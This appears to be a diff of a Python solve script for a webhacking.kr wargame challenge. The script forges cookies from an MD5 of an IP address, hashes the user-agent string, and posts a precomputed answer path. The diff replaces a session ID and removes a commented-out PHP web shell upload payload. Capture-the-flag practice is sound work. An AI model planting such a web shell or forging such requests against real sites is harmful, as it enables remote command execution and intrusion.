@@ -133,7 +133,7 @@ import time
 import random
 
 URL = "https://webhacking.kr/challenge/bonus-6/forfor.php"
-SESSION_ID = "6f5n50cakmlha0n6pbkc52c3rj"
+SESSION_ID = "123"
 cookies = {'PHPSESSID':SESSION_ID, 'test':hashlib.md5("212.8.250.236".encode()).hexdigest()}
 
 ip = "212.8.250.236"
@@ -143,14 +143,12 @@ ip = "212.8.250.236"
 #     else:
 #         ip = ip.replace(str(i), str(ord("1"))+str(ord(str(i-10))))
 # print(ip)
-ip_after = "55153507551.56.5515353506.55155194"
-ip_after = ip_after.replace('.', '')[:10]
-answer = ip_after*2
-answer = ip_after/2
-answer = answer.replace('.', '')
+# ip_after = "55153507551.56.5515353506.55155194"
+# ip_after = ip_after.replace('.', '')[:10]
+# answer = ip_after*2
+# answer = ip_after/2
+# answer = answer.replace('.', '')
 
-# this is the final staff:
-# answerip/27576753775_5515350755.php
 
 
 data = { "kk": hashlib.md5("python-requests/2.31.0".encode()).hexdigest() }
@@ -158,8 +156,10 @@ answer=""
 for i in range(97,123,2):
     answer +=chr(i)
 print(answer)
+
+# this is the final staff:
+answer = 'answerip/27576753775_5515350755.php'
 params = {"ans":answer}
-# files = {'file':('bla.php','<?php echo system($_GET[\'cmd\']) ?>')}
 
 response = requests.post(URL,params=params,data=data, cookies=cookies)
 print(response.text)
